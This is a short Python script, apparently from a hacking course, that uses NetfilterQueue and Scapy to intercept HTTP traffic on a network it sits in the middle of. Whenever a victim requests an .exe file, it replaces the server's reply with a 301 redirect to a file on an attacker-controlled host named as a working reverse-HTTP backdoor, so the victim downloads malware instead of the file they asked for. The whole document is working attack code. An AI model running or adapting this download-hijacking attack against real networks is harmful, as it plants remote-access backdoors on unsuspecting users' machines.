#!/usr/bin/env python

from netfilterqueue import NetfilterQueue
from scapy.all import *

from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.layers.dns import *
from scapy.sendrecv import *
from scapy.supersocket import *
from scapy.layers.l2 import *
from scapy.layers.dot11 import *
from scapy.utils import *
from scapy.config import *


ack_list = []


def set_load(scapy_packet, load):
    scapy_packet[Raw].load = load
    del scapy_packet[IP].len
    del scapy_packet[IP].chksum
    del scapy_packet[TCP].chksum
    return scapy_packet


def process_packet(nfq_packet):
    scapy_packet = IP(nfq_packet.get_payload())
    if scapy_packet.haslayer(Raw):  # looking for DNS Response, DNSRQ for DNS request
        if scapy_packet[TCP].dport == 80:
            if ".exe" in str(scapy_packet[Raw].load):
                print("[+] exe Request")
                ack_list.append(scapy_packet[TCP].ack)
                scapy_packet.show()
        elif scapy_packet[TCP].sport == 80:
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.7/evil_files/working_backdoor/c_meter_rev_http_serv_10.0.2.7_8080.exe\n\n")
                nfq_packet.set_payload(bytes(modified_packet))
    nfq_packet.accept()  # packet.drop() if you do not want to forward the packet ;)


queue = NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
